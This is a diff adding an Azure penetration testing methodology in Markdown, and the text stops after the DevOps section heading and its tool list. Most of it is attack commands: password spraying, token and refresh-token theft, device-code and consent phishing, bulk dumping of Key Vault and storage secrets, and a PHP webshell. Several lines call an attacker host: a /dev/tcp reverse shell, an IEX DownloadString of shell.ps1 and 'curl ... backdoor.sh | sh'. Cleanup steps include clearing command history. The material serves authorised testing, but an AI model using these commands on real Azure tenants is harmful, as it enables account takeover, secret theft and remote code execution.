@@ -1,0 +1,1633 @@
+# Azure Cloud Penetration Testing Methodology
+
+---
+
+## 1. Initial Azure Reconnaissance
+
+**Category:** External Reconnaissance  
+**Description:** Discover Azure resources and gather initial information about the target organization.
+
+**Tools Required:**
+- Azure CLI (az)
+- AADInternals
+- ROADtools
+- MicroBurst
+- curl/web browser
+
+**Steps/Commands:**
+```bash
+# Find Azure Tenant ID from domain
+curl https://login.microsoftonline.com/<DOMAIN.COM>/.well-known/openid-configuration
+curl https://login.microsoftonline.com/<DOMAIN.COM>/v2.0/.well-known/openid-configuration
+
+# Get tenant ID from any email
+curl -X POST https://login.microsoftonline.com/common/GetCredentialType -H "Content-Type: application/json" -d '{"username":"<EMAIL>"}'
+
+# Azure AD endpoints enumeration
+# Tenant ID from login page
+https://login.microsoftonline.com/<DOMAIN.COM>
+https://login.microsoftonline.com/<TENANT_ID>
+
+# Find Azure services via DNS
+# Common patterns
+nslookup <COMPANY>.blob.core.windows.net
+nslookup <COMPANY>.file.core.windows.net
+nslookup <COMPANY>.queue.core.windows.net
+nslookup <COMPANY>.table.core.windows.net
+nslookup <COMPANY>.vault.azure.net
+nslookup <COMPANY>.azurewebsites.net
+nslookup <COMPANY>.azurecontainer.io
+nslookup <COMPANY>.database.windows.net
+nslookup <COMPANY>.redis.cache.windows.net
+
+# Subdomain enumeration for Azure services
+# Using subfinder
+subfinder -d <DOMAIN.COM> | grep -E "azure|windows\.net|core\.windows"
+
+# Using amass
+amass enum -d <DOMAIN.COM> | grep -E "azure|windows\.net"
+
+# Check for Azure Storage accounts
+# Format: https://<STORAGE_ACCOUNT>.blob.core.windows.net
+for word in $(cat <WORDLIST>); do
+    response=$(curl -s -o /dev/null -w "%{http_code}" https://$word.blob.core.windows.net)
+    if [ $response != "400" ]; then
+        echo "Found: $word - Response: $response"
+    fi
+done
+
+# Check for public blob containers
+# No auth required for public containers
+curl https://<STORAGE_ACCOUNT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list
+
+# Common container names to try
+containers=("data" "files" "backup" "public" "uploads" "downloads" "documents" "config" "scripts" "logs")
+for container in "${containers[@]}"; do
+    curl -s "https://<STORAGE_ACCOUNT>.blob.core.windows.net/$container?restype=container&comp=list" | grep -q "BlobType" && echo "Found public container: $container"
+done
+
+# Azure App Service enumeration
+curl https://<APP_NAME>.azurewebsites.net
+curl https://<APP_NAME>.scm.azurewebsites.net  # Kudu console
+
+# Check for Azure AD Connect
+# Often syncs on-prem AD to Azure AD
+# Look for server named like: AADConnect, AzureADConnect, ADSync
+
+# Public Azure resources search
+# Use Shodan
+shodan search "org:<ORGANIZATION> azure"
+shodan search "hostname:*.azurewebsites.net <COMPANY>"
+
+# GitHub search for Azure resources
+# Search for connection strings, keys
+site:github.com "<COMPANY>" "DefaultEndpointsProtocol=https"
+site:github.com "<COMPANY>" "AccountName=" "AccountKey="
+site:github.com "<COMPANY>" "azure" "client_secret"
+
+# Certificate Transparency logs
+# Find Azure domains
+curl "https://crt.sh/?q=%25.<DOMAIN>&output=json" | jq -r '.[].name_value' | sort -u | grep -E "azure|windows\.net"
+
+# Using AADInternals for recon
+Import-Module AADInternals
+Get-AADIntTenantID -Domain <DOMAIN.COM>
+Get-AADIntLoginInformation -Domain <DOMAIN.COM>
+Get-AADIntTenantDomains -Domain <DOMAIN.COM>
+
+# O365 user enumeration (works for Azure AD)
+# Using o365creeper
+python3 o365creeper.py -f <EMAIL_LIST> -o <OUTPUT_FILE>
+
+# Using MSOLSpray for enumeration
+Import-Module MSOLSpray.ps1
+Invoke-MSOLSpray -UserList <USER_LIST> -Password "BadPassword123!" -Verbose
+```
+
+**Pitfalls:**
+- Rate limiting on enumeration
+- Conditional Access policies blocking
+- MFA requirements
+- Tenant security defaults
+- Azure AD Smart Lockout
+
+**Cleanup Steps:**
+```bash
+# Remove enumeration artifacts
+rm -rf recon_output/
+# Clear DNS cache
+sudo systemd-resolve --flush-caches
+```
+
+**Suggested Findings:**
+- Public storage containers
+- Exposed Azure services
+- Tenant information disclosure
+- User enumeration possible
+- Azure AD Connect presence
+
+**Conditions When to Try:**
+- Target uses Microsoft services
+- Domain has Azure presence
+- Cloud-first organizations
+- Hybrid environments
+
+---
+
+## 2. Azure AD Authentication Attacks
+
+**Category:** Authentication and Access  
+**Description:** Authenticate to Azure AD and bypass security controls.
+
+**Tools Required:**
+- Azure CLI
+- Azure AD PowerShell
+- ROADtools
+- TokenTactics
+- MFASweep
+
+**Steps/Commands:**
+```bash
+# Password spraying attack
+# Using MSOLSpray
+Import-Module MSOLSpray.ps1
+Invoke-MSOLSpray -UserList <USER_LIST> -Password "Summer2024!" -Verbose
+
+# Using o365spray
+python3 o365spray.py --spray -U <USER_LIST> -P <PASSWORD> --delay 10 --jitter 5
+
+# Using Azure CLI (be careful with lockouts)
+for user in $(cat users.txt); do
+    echo "Testing $user"
+    az login -u "$user" -p "<PASSWORD>" --allow-no-subscriptions 2>/dev/null && echo "SUCCESS: $user"
+done
+
+# Common passwords for Azure
+# <Season><Year>!  (Summer2024!, Winter2024!)
+# <Company><Year>  (Contoso2024)
+# <Company>123!
+# Password123!
+# Welcome123!
+
+# Token theft and replay
+# If you have access to a machine with Azure CLI
+az account get-access-token
+az account get-access-token --resource https://graph.microsoft.com
+
+# Extract tokens from Azure CLI
+# Windows
+cat C:\Users\<USER>\.Azure\accessTokens.json
+cat C:\Users\<USER>\.Azure\azureProfile.json
+
+# Linux
+cat ~/.azure/accessTokens.json
+cat ~/.azure/azureProfile.json
+
+# Use stolen token
+$token = "<STOLEN_TOKEN>"
+Connect-AzAccount -AccessToken $token -AccountId <EMAIL>
+
+# Or with REST API
+curl -H "Authorization: Bearer <TOKEN>" https://management.azure.com/subscriptions?api-version=2020-01-01
+
+# Device code phishing
+# Generate device code
+curl -X POST https://login.microsoftonline.com/<TENANT>/oauth2/v2.0/devicecode -d "client_id=<CLIENT_ID>&scope=https://graph.microsoft.com/.default"
+
+# Send user_code to victim to enter at https://microsoft.com/devicelogin
+# Poll for token
+curl -X POST https://login.microsoftonline.com/<TENANT>/oauth2/v2.0/token -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=<DEVICE_CODE>&client_id=<CLIENT_ID>"
+
+# Refresh token abuse
+# If you find refresh token
+curl -X POST https://login.microsoftonline.com/<TENANT>/oauth2/v2.0/token \
+    -d "client_id=<CLIENT_ID>" \
+    -d "refresh_token=<REFRESH_TOKEN>" \
+    -d "grant_type=refresh_token"
+
+# Primary Refresh Token (PRT) extraction
+# On Azure AD joined Windows machine
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # sekurlsa::cloudap
+mimikatz # sekurlsa::dpapi
+
+# Using ROADtools
+roadtx.exe prtenrich --prt <PRT> --context <CONTEXT> --derived-key <KEY>
+roadtx.exe prtauth --prt <PRT> --prt-context <CONTEXT> --client-id <CLIENT_ID>
+
+# MFA bypass techniques
+# Check if MFA is enforced
+Import-Module MFASweep.ps1
+Invoke-MFASweep -Username <USER> -Password <PASSWORD>
+
+# Legacy protocols (may bypass MFA)
+# Try IMAP, POP3, SMTP
+curl -u <USER>:<PASSWORD> imaps://outlook.office365.com/INBOX
+
+# Conditional Access bypass
+# Try from different locations/IPs
+# Try different User-Agents
+# Try legacy clients
+Connect-ExchangeOnline -UserPrincipalName <USER> -Password <PASSWORD>
+
+# Pass the Hash/Pass the Ticket
+# If you have NTLM hash from on-prem
+Import-Module AADInternals
+Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache
+Get-AADIntAccessTokenForAADGraph -SaveToCache
+
+# Application consent phishing
+# Create malicious app that requests permissions
+# Send authorization link to victims
+https://login.microsoftonline.com/<TENANT>/oauth2/v2.0/authorize?client_id=<APP_ID>&response_type=code&redirect_uri=<ATTACKER_URL>&scope=https://graph.microsoft.com/.default
+
+# Service Principal authentication
+# If you find client secret
+az login --service-principal -u <APP_ID> -p <CLIENT_SECRET> --tenant <TENANT_ID>
+
+# With certificate
+az login --service-principal -u <APP_ID> -p <CERT_PATH> --tenant <TENANT_ID>
+```
+
+**Pitfalls:**
+- Smart Lockout triggers
+- MFA enforcement
+- Conditional Access policies
+- Risk-based authentication
+- IP restrictions
+
+**Cleanup Steps:**
+```bash
+# Logout from Azure
+az logout
+Disconnect-AzAccount
+# Clear token cache
+rm ~/.azure/accessTokens.json
+```
+
+**Suggested Findings:**
+- Weak password policy
+- Password spraying successful
+- MFA bypass possible
+- Legacy auth enabled
+- Token theft vulnerable
+
+**Conditions When to Try:**
+- User list obtained
+- Password policy known
+- Hybrid environment
+- Legacy apps present
+
+---
+
+## 3. Azure Resource Enumeration
+
+**Category:** Post-Authentication Enumeration  
+**Description:** Enumerate Azure resources after gaining initial access.
+
+**Tools Required:**
+- Azure CLI
+- Azure PowerShell
+- Azure Storage Explorer
+- MicroBurst
+- ScoutSuite
+
+**Steps/Commands:**
+```bash
+# Initial enumeration with Azure CLI
+az login  # Or use stolen token
+az account list
+az account set --subscription <SUBSCRIPTION_ID>
+
+# Get current context
+az account show
+az ad signed-in-user show
+
+# Enumerate resource groups
+az group list
+az group list --output table
+
+# List all resources
+az resource list
+az resource list --output table
+
+# Enumerate Azure AD
+# Users
+az ad user list
+az ad user list --query "[].{Name:displayName,UPN:userPrincipalName,ObjectId:objectId}"
+
+# Groups
+az ad group list
+az ad group list --query "[].{Name:displayName,ObjectId:objectId}"
+
+# Applications
+az ad app list
+az ad app list --query "[].{Name:displayName,AppId:appId}"
+
+# Service Principals
+az ad sp list
+az ad sp list --all
+
+# Check current permissions
+az role assignment list --assignee <USER_PRINCIPAL_NAME>
+az role assignment list --all
+
+# Storage Account enumeration
+az storage account list
+az storage account list --query "[].{Name:name,ResourceGroup:resourceGroup,Location:location}"
+
+# For each storage account
+az storage account keys list --account-name <STORAGE_ACCOUNT> --resource-group <RG>
+
+# List containers
+az storage container list --account-name <STORAGE_ACCOUNT> --account-key <KEY>
+
+# List blobs
+az storage blob list --container-name <CONTAINER> --account-name <STORAGE_ACCOUNT> --account-key <KEY>
+
+# Download interesting files
+az storage blob download --container-name <CONTAINER> --name <BLOB> --file <OUTPUT_FILE> --account-name <STORAGE_ACCOUNT>
+
+# Virtual Machines
+az vm list
+az vm list --show-details
+
+# Get VM passwords
+az vm user reset-password --resource-group <RG> --name <VM_NAME> --username <USER> --password <NEW_PASSWORD>
+
+# Run commands on VM
+az vm run-command invoke --resource-group <RG> --name <VM_NAME> --command-id RunShellScript --scripts "whoami"
+
+# Key Vault secrets
+az keyvault list
+az keyvault secret list --vault-name <VAULT_NAME>
+az keyvault secret show --vault-name <VAULT_NAME> --name <SECRET_NAME>
+
+# Download all secrets
+for secret in $(az keyvault secret list --vault-name <VAULT_NAME> --query "[].name" -o tsv); do
+    echo "Downloading $secret"
+    az keyvault secret download --vault-name <VAULT_NAME> --name "$secret" --file "$secret.txt"
+done
+
+# Azure SQL Databases
+az sql server list
+az sql db list --server <SERVER_NAME> --resource-group <RG>
+
+# Get connection string
+az sql db show-connection-string --server <SERVER> --name <DB> --client ado.net
+
+# Web Apps
+az webapp list
+az functionapp list
+
+# Get publishing credentials
+az webapp deployment list-publishing-profiles --name <APP_NAME> --resource-group <RG>
+
+# Download source code
+az webapp deployment source download --name <APP_NAME> --resource-group <RG>
+
+# Container Registry
+az acr list
+az acr repository list --name <REGISTRY_NAME>
+
+# Pull images
+az acr login --name <REGISTRY_NAME>
+docker pull <REGISTRY_NAME>.azurecr.io/<IMAGE>:<TAG>
+
+# Logic Apps (may contain credentials)
+az logic workflow list
+az logic workflow show --resource-group <RG> --name <LOGIC_APP>
+
+# Automation Accounts (RunBooks)
+az automation account list
+az automation runbook list --automation-account-name <ACCOUNT> --resource-group <RG>
+az automation runbook show --automation-account-name <ACCOUNT> --resource-group <RG> --name <RUNBOOK>
+
+# Using PowerShell for deeper enumeration
+Connect-AzAccount
+Get-AzResource
+Get-AzVM
+Get-AzStorageAccount
+Get-AzKeyVault
+Get-AzWebApp
+
+# Using MicroBurst
+Import-Module MicroBurst.psm1
+Get-AzDomainInfo -Verbose
+Get-AzPasswords
+Get-AzStorageContent
+Get-AzKeyVaultContent
+
+# Using ScoutSuite
+scout azure --cli
+# Review HTML report
+
+# Azure DevOps enumeration
+az devops project list --organization https://dev.azure.com/<ORG>
+az repos list --organization https://dev.azure.com/<ORG> --project <PROJECT>
+az pipelines list --organization https://dev.azure.com/<ORG> --project <PROJECT>
+```
+
+**Pitfalls:**
+- Limited RBAC permissions
+- Resource locks
+- Network restrictions
+- Audit logging
+- Azure Policy restrictions
+
+**Cleanup Steps:**
+```bash
+# Remove downloaded files
+rm -rf azure_loot/
+# Clear command history
+history -c
+```
+
+**Suggested Findings:**
+- Sensitive data in storage
+- Hardcoded credentials
+- Excessive permissions
+- Unencrypted secrets
+- Public resources
+
+**Conditions When to Try:**
+- Initial access gained
+- Service principal compromised
+- User account access
+- Read permissions available
+
+---
+
+## 4. Azure Storage Exploitation
+
+**Category:** Data Access  
+**Description:** Exploit Azure Storage accounts for data exfiltration and manipulation.
+
+**Tools Required:**
+- Azure Storage Explorer
+- azcopy
+- Azure CLI
+- curl
+
+**Steps/Commands:**
+```bash
+# Storage Account enumeration
+az storage account list
+
+# Get storage keys
+az storage account keys list --account-name <STORAGE_ACCOUNT> --resource-group <RG>
+
+# Using connection string
+export AZURE_STORAGE_CONNECTION_STRING="DefaultEndpointsProtocol=https;AccountName=<ACCOUNT>;AccountKey=<KEY>;EndpointSuffix=core.windows.net"
+
+# List all containers
+az storage container list
+
+# Public container access (no auth needed)
+curl "https://<STORAGE_ACCOUNT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list"
+
+# Generate SAS token
+az storage account generate-sas \
+    --account-name <STORAGE_ACCOUNT> \
+    --account-key <KEY> \
+    --expiry 2025-01-01 \
+    --permissions rwdlacup \
+    --resource-types sco \
+    --services bfqt
+
+# Use SAS token
+curl "https://<STORAGE_ACCOUNT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list&<SAS_TOKEN>"
+
+# Download entire container
+az storage blob download-batch \
+    --destination ./download \
+    --source <CONTAINER> \
+    --account-name <STORAGE_ACCOUNT> \
+    --account-key <KEY>
+
+# Using azcopy for mass download
+azcopy login  # Interactive login
+# Or with SAS
+azcopy copy "https://<STORAGE_ACCOUNT>.blob.core.windows.net/<CONTAINER>?<SAS_TOKEN>" "./download" --recursive
+
+# Search for specific files
+az storage blob list \
+    --container-name <CONTAINER> \
+    --account-name <STORAGE_ACCOUNT> \
+    --query "[?contains(name, 'password')]"
+
+# Upload malicious files
+az storage blob upload \
+    --container-name <CONTAINER> \
+    --file backdoor.aspx \
+    --name backdoor.aspx \
+    --account-name <STORAGE_ACCOUNT>
+
+# Azure Files (SMB)
+az storage share list --account-name <STORAGE_ACCOUNT>
+az storage file list --share-name <SHARE> --account-name <STORAGE_ACCOUNT>
+
+# Mount Azure File Share
+# Linux
+sudo mkdir /mnt/azurefiles
+sudo mount -t cifs //<STORAGE_ACCOUNT>.file.core.windows.net/<SHARE> /mnt/azurefiles -o vers=3.0,username=<STORAGE_ACCOUNT>,password=<KEY>,dir_mode=0777,file_mode=0777
+
+# Windows
+net use Z: \\<STORAGE_ACCOUNT>.file.core.windows.net\<SHARE> /u:<STORAGE_ACCOUNT> <KEY>
+
+# Queue Storage (may contain commands/messages)
+az storage queue list --account-name <STORAGE_ACCOUNT>
+az storage message peek --queue-name <QUEUE> --account-name <STORAGE_ACCOUNT>
+
+# Table Storage
+az storage table list --account-name <STORAGE_ACCOUNT>
+az storage entity query --table-name <TABLE> --account-name <STORAGE_ACCOUNT>
+
+# Snapshot enumeration (historical data)
+az storage blob list --container-name <CONTAINER> --include s --account-name <STORAGE_ACCOUNT>
+
+# Access blob snapshots
+az storage blob download \
+    --container-name <CONTAINER> \
+    --name <BLOB> \
+    --snapshot <SNAPSHOT_TIME> \
+    --file <OUTPUT_FILE> \
+    --account-name <STORAGE_ACCOUNT>
+
+# Soft deleted blobs
+az storage blob list --container-name <CONTAINER> --include d --account-name <STORAGE_ACCOUNT>
+
+# Restore soft deleted blob
+az storage blob undelete \
+    --container-name <CONTAINER> \
+    --name <BLOB> \
+    --account-name <STORAGE_ACCOUNT>
+
+# Static website hosting
+# Check if enabled
+az storage blob service-properties show --account-name <STORAGE_ACCOUNT>
+
+# Access static website
+curl https://<STORAGE_ACCOUNT>.z<ZONE_NUMBER>.web.core.windows.net/
+
+# Upload to $web container (website)
+az storage blob upload \
+    --container-name '$web' \
+    --file shell.html \
+    --name shell.html \
+    --account-name <STORAGE_ACCOUNT>
+```
+
+**Pitfalls:**
+- IP firewall rules
+- Private endpoints only
+- Encryption at rest
+- Immutable storage
+- Storage analytics logging
+
+**Cleanup Steps:**
+```bash
+# Remove uploaded files
+az storage blob delete --container-name <CONTAINER> --name <BLOB> --account-name <STORAGE_ACCOUNT>
+# Unmount shares
+umount /mnt/azurefiles
+```
+
+**Suggested Findings:**
+- Public container access
+- Sensitive data exposure
+- Weak access controls
+- SAS token leakage
+- Backup data accessible
+
+**Conditions When to Try:**
+- Storage accounts discovered
+- SAS tokens found
+- Connection strings exposed
+- Public containers identified
+
+---
+
+## 5. Azure Key Vault Exploitation
+
+**Category:** Secrets Management  
+**Description:** Extract secrets, keys, and certificates from Azure Key Vault.
+
+**Tools Required:**
+- Azure CLI
+- Azure PowerShell
+- curl
+- MicroBurst
+
+**Steps/Commands:**
+```bash
+# List all Key Vaults
+az keyvault list
+az keyvault list --query "[].{Name:name,ResourceGroup:resourceGroup}"
+
+# Check access policies
+az keyvault show --name <VAULT_NAME>
+az keyvault show --name <VAULT_NAME> --query "properties.accessPolicies"
+
+# List secrets
+az keyvault secret list --vault-name <VAULT_NAME>
+az keyvault secret list --vault-name <VAULT_NAME> --query "[].{Name:name,Enabled:attributes.enabled}"
+
+# Get secret values
+az keyvault secret show --vault-name <VAULT_NAME> --name <SECRET_NAME>
+az keyvault secret show --vault-name <VAULT_NAME> --name <SECRET_NAME> --query "value" -o tsv
+
+# Download all secrets
+for secret in $(az keyvault secret list --vault-name <VAULT_NAME> --query "[].name" -o tsv); do
+    value=$(az keyvault secret show --vault-name <VAULT_NAME> --name "$secret" --query "value" -o tsv)
+    echo "$secret: $value" >> keyvault_secrets.txt
+done
+
+# List keys
+az keyvault key list --vault-name <VAULT_NAME>
+
+# Export key (if exportable)
+az keyvault key download --vault-name <VAULT_NAME> --name <KEY_NAME> --file key.pem
+
+# List certificates
+az keyvault certificate list --vault-name <VAULT_NAME>
+
+# Download certificate
+az keyvault certificate download --vault-name <VAULT_NAME> --name <CERT_NAME> --file cert.pem
+
+# Get certificate with private key (if permissions)
+az keyvault secret show --vault-name <VAULT_NAME> --name <CERT_NAME> --query "value" -o tsv | base64 -d > cert.pfx
+
+# Using REST API directly
+# Get access token
+token=$(az account get-access-token --resource "https://vault.azure.net" --query accessToken -o tsv)
+
+# List secrets via API
+curl -H "Authorization: Bearer $token" "https://<VAULT_NAME>.vault.azure.net/secrets?api-version=7.3"
+
+# Get secret value
+curl -H "Authorization: Bearer $token" "https://<VAULT_NAME>.vault.azure.net/secrets/<SECRET_NAME>?api-version=7.3"
+
+# Managed Identity abuse
+# If on Azure VM with managed identity
+# Get token for Key Vault
+curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
+
+# Use token to access Key Vault
+curl -H "Authorization: Bearer <TOKEN>" "https://<VAULT_NAME>.vault.azure.net/secrets/<SECRET_NAME>?api-version=7.3"
+
+# Soft-deleted secrets
+az keyvault secret list-deleted --vault-name <VAULT_NAME>
+az keyvault secret recover --vault-name <VAULT_NAME> --name <SECRET_NAME>
+
+# Backup secrets (creates encrypted backup)
+az keyvault secret backup --vault-name <VAULT_NAME> --name <SECRET_NAME> --file backup.secret
+
+# Historical versions
+az keyvault secret list-versions --vault-name <VAULT_NAME> --name <SECRET_NAME>
+az keyvault secret show --vault-name <VAULT_NAME> --name <SECRET_NAME> --version <VERSION>
+
+# Using PowerShell
+Connect-AzAccount
+Get-AzKeyVault
+Get-AzKeyVaultSecret -VaultName <VAULT_NAME>
+Get-AzKeyVaultSecret -VaultName <VAULT_NAME> -Name <SECRET_NAME> -AsPlainText
+
+# Using MicroBurst
+Import-Module MicroBurst.psm1
+Get-AzKeyVaultContent -All
+```
+
+**Pitfalls:**
+- Network restrictions
+- Purge protection enabled
+- HSM-backed keys
+- Audit logging
+- Access policy limitations
+
+**Cleanup Steps:**
+```bash
+# Remove downloaded secrets
+shred -u keyvault_secrets.txt
+rm -f *.pem *.pfx
+```
+
+**Suggested Findings:**
+- Plaintext secrets exposed
+- Excessive access permissions
+- Deleted secrets recoverable
+- Missing network restrictions
+- Audit logging disabled
+
+**Conditions When to Try:**
+- Key Vaults discovered
+- Managed identity available
+- Service principal access
+- Read permissions on vault
+
+---
+
+## 6. Azure Virtual Machine Exploitation
+
+**Category:** Compute Resources  
+**Description:** Exploit Azure VMs for code execution and lateral movement.
+
+**Tools Required:**
+- Azure CLI
+- Azure PowerShell
+- SSH/RDP clients
+- Metasploit
+
+**Steps/Commands:**
+```bash
+# List all VMs
+az vm list --output table
+az vm list --show-details
+
+# Get VM details
+az vm show --resource-group <RG> --name <VM_NAME>
+
+# Reset VM password (requires permissions)
+az vm user reset-password \
+    --resource-group <RG> \
+    --name <VM_NAME> \
+    --username <USERNAME> \
+    --password <NEW_PASSWORD>
+
+# Execute commands via Run Command
+az vm run-command invoke \
+    --resource-group <RG> \
+    --name <VM_NAME> \
+    --command-id RunShellScript \
+    --scripts "whoami && hostname && cat /etc/passwd"
+
+# Windows VM
+az vm run-command invoke \
+    --resource-group <RG> \
+    --name <VM_NAME> \
+    --command-id RunPowerShellScript \
+    --scripts "whoami; hostname; net user"
+
+# Upload and execute scripts
+az vm run-command invoke \
+    --resource-group <RG> \
+    --name <VM_NAME> \
+    --command-id RunShellScript \
+    --scripts @script.sh
+
+# Create reverse shell via Run Command
+az vm run-command invoke \
+    --resource-group <RG> \
+    --name <VM_NAME> \
+    --command-id RunShellScript \
+    --scripts "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1"
+
+# Access VM disk snapshots
+az snapshot list
+az snapshot create \
+    --resource-group <RG> \
+    --source <DISK_ID> \
+    --name <SNAPSHOT_NAME>
+
+# Export disk
+az disk grant-access \
+    --resource-group <RG> \
+    --name <DISK_NAME> \
+    --duration-in-seconds 3600 \
+    --access-level Read
+
+# Download disk (returns SAS URL)
+wget "<SAS_URL>" -O disk.vhd
+
+# VM Extensions (may contain passwords)
+az vm extension list --resource-group <RG> --vm-name <VM_NAME>
+az vm extension show \
+    --resource-group <RG> \
+    --vm-name <VM_NAME> \
+    --name <EXTENSION_NAME>
+
+# Custom Script Extension abuse
+az vm extension set \
+    --resource-group <RG> \
+    --vm-name <VM_NAME> \
+    --name CustomScriptExtension \
+    --publisher Microsoft.Compute \
+    --settings '{"commandToExecute":"powershell.exe -c \"IEX(New-Object Net.WebClient).DownloadString(\"http://<ATTACKER_IP>/shell.ps1\")\""}'
+
+# Access Serial Console
+az serial-console connect --resource-group <RG> --name <VM_NAME>
+
+# Instance Metadata Service (from within VM)
+# Get access token
+curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+# Get VM metadata
+curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+# User data (may contain passwords)
+curl -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" | base64 -d
+
+# Bastion exploitation
+az network bastion list
+az network bastion rdp \
+    --name <BASTION_NAME> \
+    --resource-group <RG> \
+    --target-resource-id <VM_RESOURCE_ID>
+
+# SSH via Bastion
+az network bastion ssh \
+    --name <BASTION_NAME> \
+    --resource-group <RG> \
+    --target-resource-id <VM_RESOURCE_ID> \
+    --auth-type password \
+    --username <USERNAME>
+
+# Scale Set exploitation
+az vmss list
+az vmss list-instances --resource-group <RG> --name <VMSS_NAME>
+
+# Run command on all instances
+az vmss run-command invoke \
+    --resource-group <RG> \
+    --name <VMSS_NAME> \
+    --command-id RunShellScript \
+    --instance-id "*" \
+    --scripts "curl http://<ATTACKER_IP>/backdoor.sh | sh"
+
+# Get VM passwords from Key Vault (common pattern)
+# Look for secrets named like VM names
+az keyvault secret list --vault-name <VAULT> --query "[?contains(name, 'vm')]"
+```
+
+**Pitfalls:**
+- Just-in-Time access
+- Network security groups
+- Azure Firewall rules
+- VM backup protection
+- Update management enabled
+
+**Cleanup Steps:**
+```bash
+# Remove extensions
+az vm extension delete --resource-group <RG> --vm-name <VM_NAME> --name <EXTENSION_NAME>
+# Revoke disk access
+az disk revoke-access --resource-group <RG> --name <DISK_NAME>
+```
+
+**Suggested Findings:**
+- Run Command enabled
+- Weak VM passwords
+- Missing network segmentation
+- Unencrypted disks
+- Excessive VM permissions
+
+**Conditions When to Try:**
+- VM Contributor role
+- Run Command available
+- Custom Script Extension access
+- Managed identity on VM
+
+---
+
+## 7. Azure Web Application Exploitation
+
+**Category:** Application Services  
+**Description:** Exploit Azure App Service, Functions, and Logic Apps.
+
+**Tools Required:**
+- Azure CLI
+- curl
+- git
+- Visual Studio Code
+- Kudu tools
+
+**Steps/Commands:**
+```bash
+# List Web Apps
+az webapp list
+az functionapp list
+az logic workflow list
+
+# Get Web App details
+az webapp show --resource-group <RG> --name <APP_NAME>
+
+# Get publishing credentials
+az webapp deployment list-publishing-credentials \
+    --resource-group <RG> \
+    --name <APP_NAME>
+
+# Get deployment credentials
+az webapp deployment list-publishing-profiles \
+    --resource-group <RG> \
+    --name <APP_NAME> \
+    --output json > publishing_profile.json
+
+# Access Kudu console (SCM site)
+# Browse to: https://<APP_NAME>.scm.azurewebsites.net
+# Or with creds
+curl -u '<USERNAME>:<PASSWORD>' https://<APP_NAME>.scm.azurewebsites.net/api/command \
+    -H "Content-Type: application/json" \
+    -d '{"command":"cmd.exe /c whoami","dir":"site\\wwwroot"}'
+
+# Execute commands via Kudu
+curl -X POST https://<APP_NAME>.scm.azurewebsites.net/api/command \
+    -H "Authorization: Basic <BASE64_CREDS>" \
+    -H "Content-Type: application/json" \
+    -d '{"command":"powershell.exe","dir":"site\\wwwroot","args":["-c","whoami"]}'
+
+# Upload webshell via Kudu
+curl -X PUT https://<APP_NAME>.scm.azurewebsites.net/api/vfs/site/wwwroot/shell.aspx \
+    -H "Authorization: Basic <BASE64_CREDS>" \
+    --data-binary @shell.aspx
+
+# Access uploaded shell
+curl https://<APP_NAME>.azurewebsites.net/shell.aspx?cmd=whoami
+
+# Git deployment credentials
+az webapp deployment user set --user-name <USERNAME> --password <PASSWORD>
+
+# Clone source code
+git clone https://<USERNAME>@<APP_NAME>.scm.azurewebsites.net/<APP_NAME>.git
+
+# Push backdoor
+echo "<?php system(\$_GET['cmd']); ?>" > shell.php
+git add shell.php
+git commit -m "Update"
+git push
+
+# App Service Environment variables (may contain secrets)
+az webapp config appsettings list --resource-group <RG> --name <APP_NAME>
+
+# Connection strings
+az webapp config connection-string list --resource-group <RG> --name <APP_NAME>
+
+# Managed Identity token (from within app)
+curl -H "X-IDENTITY-HEADER: <SECRET>" "http://127.0.0.1:42356/MSI/token?resource=https://management.azure.com/"
+
+# Function App exploitation
+az functionapp list
+az functionapp function list --resource-group <RG> --name <FUNCTION_APP>
+
+# Get function keys
+az functionapp keys list --resource-group <RG> --name <FUNCTION_APP>
+az functionapp function keys list \
+    --resource-group <RG> \
+    --name <FUNCTION_APP> \
+    --function-name <FUNCTION_NAME>
+
+# Invoke function with key
+curl https://<FUNCTION_APP>.azurewebsites.net/api/<FUNCTION_NAME>?code=<FUNCTION_KEY>
+
+# Logic Apps exploitation
+az logic workflow list
+az logic workflow show --resource-group <RG> --name <LOGIC_APP>
+
+# Get run history (may contain sensitive data)
+az logic workflow run list --resource-group <RG> --name <LOGIC_APP>
+az logic workflow run show \
+    --resource-group <RG> \
+    --name <LOGIC_APP> \
+    --run-name <RUN_NAME>
+
+# Trigger Logic App
+curl -X POST <LOGIC_APP_TRIGGER_URL>
+
+# Hybrid connections exploitation
+az webapp hybrid-connection list --resource-group <RG> --name <APP_NAME>
+
+# Access on-premises resources through hybrid connection
+# From within compromised app
+
+# Backup exploitation
+az webapp config backup list --resource-group <RG> --webapp-name <APP_NAME>
+
+# Download backup
+az webapp config backup download \
+    --resource-group <RG> \
+    --webapp-name <APP_NAME> \
+    --backup-name <BACKUP_NAME> \
+    --file backup.zip
+
+# Container instances
+az container list
+az container exec \
+    --resource-group <RG> \
+    --name <CONTAINER_NAME> \
+    --exec-command "/bin/bash"
+
+# App Service certificates
+az webapp config ssl list --resource-group <RG>
+```
+
+**Pitfalls:**
+- IP restrictions
+- Managed identity limitations
+- Azure Front Door/CDN
+- Deployment slots
+- App Service Environment isolation
+
+**Cleanup Steps:**
+```bash
+# Remove uploaded files
+curl -X DELETE https://<APP_NAME>.scm.azurewebsites.net/api/vfs/site/wwwroot/shell.aspx
+# Reset deployment credentials
+az webapp deployment user set --user-name <NEW_USERNAME> --password <NEW_PASSWORD>
+```
+
+**Suggested Findings:**
+- Kudu console accessible
+- Deployment credentials weak
+- Source code exposure
+- Sensitive data in configs
+- Missing IP restrictions
+
+**Conditions When to Try:**
+- Web apps discovered
+- Publishing profiles found
+- Git credentials obtained
+- Function keys discovered
+
+---
+
+## 8. Azure DevOps and CI/CD Pipeline Exploitation
+
+**Category:** DevOps Services  
+**Description:** Exploit Azure DevOps for source code access and pipeline manipulation.
+
+**Tools Required:**
+- Azure CLI with DevOps extension
+- git
+- curl
+- Visual Studio Code
+
